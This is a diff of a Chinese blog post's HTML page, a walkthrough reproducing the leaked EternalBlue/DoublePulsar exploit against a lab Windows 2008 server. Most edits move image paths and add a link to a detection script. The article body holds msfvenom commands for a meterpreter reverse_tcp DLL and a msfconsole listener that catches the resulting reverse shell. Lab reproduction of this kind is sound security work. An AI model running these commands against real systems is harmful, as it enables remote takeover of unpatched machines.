@@ -83,7 +83,7 @@
 <link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="windows,code execution,equation group,eternalBlue,doublePulsar,tool," />
+  <meta name="keywords" content="windows,equation group,code execution,eternalBlue,doublePulsar,tool," />
 
 
 
@@ -105,27 +105,27 @@
 <meta property="og:url" content="http://orleven.orleven.com/2017/04/22/equation-group-0day-2017/index.html">
 <meta property="og:site_name" content="Orleven Blog">
 <meta property="og:description" content="概述Shadow Brokers黑客组织上周泄露了NSA方程式组织的一些工具，其中某些工具客直接拿下Windows服务器 。">
-<meta property="og:image" content="http://orleven.orleven.com/images/ETERNALBLUE-1.png">
-<meta property="og:image" content="http://orleven.orleven.com/images/ETERNALBLUE-2.png">
-<meta property="og:image" content="http://orleven.orleven.com/images/ETERNALBLUE-3.png">
-<meta property="og:image" content="http://orleven.orleven.com/images/ETERNALBLUE-4.png">
-<meta property="og:image" content="http://orleven.orleven.com/images/ETERNALBLUE-5.png">
-<meta property="og:image" content="http://orleven.orleven.com/images/ETERNALBLUE-6.png">
-<meta property="og:image" content="http://orleven.orleven.com/images/ETERNALBLUE-7.png">
-<meta property="og:image" content="http://orleven.orleven.com/images/ETERNALBLUE-8.png">
-<meta property="og:image" content="http://orleven.orleven.com/images/ETERNALBLUE-9.png">
-<meta property="og:image" content="http://orleven.orleven.com/images/ETERNALBLUE-10.png">
-<meta property="og:image" content="http://orleven.orleven.com/images/ETERNALBLUE-11.png">
-<meta property="og:image" content="http://orleven.orleven.com/images/ETERNALBLUE-12.png">
-<meta property="og:image" content="http://orleven.orleven.com/images/ETERNALBLUE-13.png">
-<meta property="og:image" content="http://orleven.orleven.com/images/ETERNALBLUE-14.png">
-<meta property="og:image" content="http://orleven.orleven.com/images/ETERNALBLUE-15.png">
-<meta property="og:image" content="http://orleven.orleven.com/images/ETERNALBLUE-16.png">
-<meta property="og:updated_time" content="2017-04-27T06:36:54.999Z">
+<meta property="og:image" content="http://orleven.orleven.com/images/ETERNALBLUE/ETERNALBLUE-1.png">
+<meta property="og:image" content="http://orleven.orleven.com/images/ETERNALBLUE/ETERNALBLUE-2.png">
+<meta property="og:image" content="http://orleven.orleven.com/images/ETERNALBLUE/ETERNALBLUE-3.png">
+<meta property="og:image" content="http://orleven.orleven.com/images/ETERNALBLUE/ETERNALBLUE-4.png">
+<meta property="og:image" content="http://orleven.orleven.com/images/ETERNALBLUE/ETERNALBLUE-5.png">
+<meta property="og:image" content="http://orleven.orleven.com/images/ETERNALBLUE/ETERNALBLUE-6.png">
+<meta property="og:image" content="http://orleven.orleven.com/images/ETERNALBLUE/ETERNALBLUE-7.png">
+<meta property="og:image" content="http://orleven.orleven.com/images/ETERNALBLUE/ETERNALBLUE-8.png">
+<meta property="og:image" content="http://orleven.orleven.com/images/ETERNALBLUE/ETERNALBLUE-9.png">
+<meta property="og:image" content="http://orleven.orleven.com/images/ETERNALBLUE/ETERNALBLUE-10.png">
+<meta property="og:image" content="http://orleven.orleven.com/images/ETERNALBLUE/ETERNALBLUE-11.png">
+<meta property="og:image" content="http://orleven.orleven.com/images/ETERNALBLUE/ETERNALBLUE-12.png">
+<meta property="og:image" content="http://orleven.orleven.com/images/ETERNALBLUE/ETERNALBLUE-13.png">
+<meta property="og:image" content="http://orleven.orleven.com/images/ETERNALBLUE/ETERNALBLUE-14.png">
+<meta property="og:image" content="http://orleven.orleven.com/images/ETERNALBLUE/ETERNALBLUE-15.png">
+<meta property="og:image" content="http://orleven.orleven.com/images/ETERNALBLUE/ETERNALBLUE-16.png">
+<meta property="og:updated_time" content="2017-06-24T09:32:40.681Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="2017 Equation Group 0day Tools">
 <meta name="twitter:description" content="概述Shadow Brokers黑客组织上周泄露了NSA方程式组织的一些工具，其中某些工具客直接拿下Windows服务器 。">
-<meta name="twitter:image" content="http://orleven.orleven.com/images/ETERNALBLUE-1.png">
+<meta name="twitter:image" content="http://orleven.orleven.com/images/ETERNALBLUE/ETERNALBLUE-1.png">
 
 
 
@@ -548,35 +548,36 @@
 <li>win2008 </li>
 <li>IP : 192.168.111.158</li>
 </ul>
-<p>systeminfo 信息如下：<br><img src="/images/ETERNALBLUE-1.png" alt="ETERNALBLUE-1"></p>
+<p>systeminfo 信息如下：<br><img src="/images/ETERNALBLUE/ETERNALBLUE-1.png" alt="ETERNALBLUE-1"></p>
 <h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>初始化配置，创建一个攻击项目。</p>
-<p><img src="/images/ETERNALBLUE-2.png" alt="ETERNALBLUE-2"></p>
-<p><img src="/images/ETERNALBLUE-3.png" alt="ETERNALBLUE-3"></p>
-<p><img src="/images/ETERNALBLUE-4.png" alt="ETERNALBLUE-4"></p>
+<p><img src="/images/ETERNALBLUE/ETERNALBLUE-2.png" alt="ETERNALBLUE-2"></p>
+<p><img src="/images/ETERNALBLUE/ETERNALBLUE-3.png" alt="ETERNALBLUE-3"></p>
+<p><img src="/images/ETERNALBLUE/ETERNALBLUE-4.png" alt="ETERNALBLUE-4"></p>
 <p>使用 <code>ETERNALBLUE</code> 模块。 </p>
-<p><img src="/images/ETERNALBLUE-5.png" alt="ETERNALBLUE-5"></p>
-<p><img src="/images/ETERNALBLUE-6.png" alt="ETERNALBLUE-6"></p>
-<p><img src="/images/ETERNALBLUE-7.png" alt="ETERNALBLUE-7"></p>
-<p><img src="/images/ETERNALBLUE-8.png" alt="ETERNALBLUE-8"></p>
+<p><img src="/images/ETERNALBLUE/ETERNALBLUE-5.png" alt="ETERNALBLUE-5"></p>
+<p><img src="/images/ETERNALBLUE/ETERNALBLUE-6.png" alt="ETERNALBLUE-6"></p>
+<p><img src="/images/ETERNALBLUE/ETERNALBLUE-7.png" alt="ETERNALBLUE-7"></p>
+<p><img src="/images/ETERNALBLUE/ETERNALBLUE-8.png" alt="ETERNALBLUE-8"></p>
 <p>使用 <code>DoublePulsar</code> 模块。</p>
 <p>DoublePulsar是一个后门程序，用于在已感染的系统上注入和运行恶意代码。这是一种NSA用作监听使用的后门程序，如今在GitHub上得到免费发布后，任何人均可使用。其软件是在Windows XP到Server 2008 R2系统版本中的计算机上，通过使用EternalBlue Exploit的SMB文件共享服务端口启动旧版本下的远程执行代码RCE，随后进行程序的安装。也就是说，会受到攻击影响的计算机系统是存在漏洞的Windows版本，因为这给攻击者提供了其SMB端口。</p>
 <p>这里要选择SMB和对应的目标操作系统位数下面的话是攻击的4个操作 选择RunDLL。</p>
-<p><img src="/images/ETERNALBLUE-9.png" alt="ETERNALBLUE-9"></p>
-<p><img src="/images/ETERNALBLUE-10.png" alt="ETERNALBLUE-10"></p>
+<p><img src="/images/ETERNALBLUE/ETERNALBLUE-9.png" alt="ETERNALBLUE-9"></p>
+<p><img src="/images/ETERNALBLUE/ETERNALBLUE-10.png" alt="ETERNALBLUE-10"></p>
 <p>这里用攻击机2 kali的msfvenom 生成一下dll 这里使用的是reverse_tcp的paylaod 可以根据网络情况采用其他payload</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.108.144 LPORT=5555 -f dll &gt; s.dll</div></pre></td></tr></table></figure>
-<p><img src="/images/ETERNALBLUE-11.png" alt="ETERNALBLUE-11"></p>
+<p><img src="/images/ETERNALBLUE/ETERNALBLUE-11.png" alt="ETERNALBLUE-11"></p>
 <p>把生成的s.dll传到攻击机1上去，</p>
 <p>然后kali开启msfconsole 监听，下面的payload要和上面msfvenom的payload对应起来</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">$ msfconsole</div><div class="line">    msf &gt; use exploit/multi/handler</div><div class="line">    msf &gt; set LHOST 192.168.108.131</div><div class="line">    msf &gt; set LPORT 5555</div><div class="line">    msf &gt; set PAYLOAD windows/x64/meterpreter/reverse_tcp</div><div class="line">    msf &gt; exploit</div></pre></td></tr></table></figure>
-<p><img src="/images/ETERNALBLUE-12.png" alt="ETERNALBLUE-12"></p>
-<p><img src="/images/ETERNALBLUE-13.png" alt="ETERNALBLUE-13"></p>
+<p><img src="/images/ETERNALBLUE/ETERNALBLUE-12.png" alt="ETERNALBLUE-12"></p>
+<p><img src="/images/ETERNALBLUE/ETERNALBLUE-13.png" alt="ETERNALBLUE-13"></p>
 <p>然后操作fb.py ，加载s.dll。</p>
-<p><img src="/images/ETERNALBLUE-14.png" alt="ETERNALBLUE-14"></p>
-<p><img src="/images/ETERNALBLUE-15.png" alt="ETERNALBLUE-15"></p>
+<p><img src="/images/ETERNALBLUE/ETERNALBLUE-14.png" alt="ETERNALBLUE-14"></p>
+<p><img src="/images/ETERNALBLUE/ETERNALBLUE-15.png" alt="ETERNALBLUE-15"></p>
 <p>kali 收到反弹的shell 。</p>
-<p><img src="/images/ETERNALBLUE-16.png" alt="ETERNALBLUE-16"></p>
+<p><img src="/images/ETERNALBLUE/ETERNALBLUE-16.png" alt="ETERNALBLUE-16"></p>
 <h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>当然，还有其他的攻击模块，下次继续更新。</p>
+<p>为了平时的渗透测试的方便，我临时写了个检测的<a href="https://github.com/orleven/NsaCheckTool" target="_blank" rel="external">脚本</a>（测试版）,供大家测试使用。</p>
 <h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://po.baidu.com/feed/share?context=%7B%2522nid%2522%3A%2522news_10421100930874351826%2522%7D" target="_blank" rel="external">ShadowBrokers方程式工具包浅析，揭秘方程式组织工具包的前世今生</a><br><a href="http://mp.weixin.qq.com/s?__biz=MzIyNTA1NzAxOA==&amp;mid=502990295&amp;idx=1&amp;sn=181c1e9b01854b87d3d4752c593c4dd4&amp;chksm=700a2442477dad54b542427edad3ec16df8cde9f470ee4e6f4597d4866d64b405801baf3d799&amp;mpshare=1&amp;scene=23&amp;srcid=0415zAW8ITp4RRkubgmCNYRI#rd" target="_blank" rel="external">方程式 0day ETERNALBLUE  复现过程</a></p>
 
       
@@ -609,9 +610,9 @@
           
             <a href="/tags/windows/" rel="tag"># windows</a>
           
-            <a href="/tags/code-execution/" rel="tag"># code execution</a>
-          
             <a href="/tags/equation-group/" rel="tag"># equation group</a>
+          
+            <a href="/tags/code-execution/" rel="tag"># code execution</a>
           
             <a href="/tags/eternalBlue/" rel="tag"># eternalBlue</a>
           
@@ -639,6 +640,10 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/06/22/android-base/" rel="prev" title="Android 渗透测试基础入门">
+                Android 渗透测试基础入门 <i class="fa fa-chevron-right"></i>
+              </a>
             
           </div>
         </div>
@@ -710,7 +715,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">17</span>
+                <span class="site-state-item-count">18</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -721,7 +726,7 @@
             
             <div class="site-state-item site-state-categories">
               <a href="/categories/index.html">
-                <span class="site-state-item-count">13</span>
+                <span class="site-state-item-count">14</span>
                 <span class="site-state-item-name">分类</span>
               </a>
             </div>
@@ -732,7 +737,7 @@
             
             <div class="site-state-item site-state-tags">
               <a href="/tags/index-1.html">
-                <span class="site-state-item-count">38</span>
+                <span class="site-state-item-count">39</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
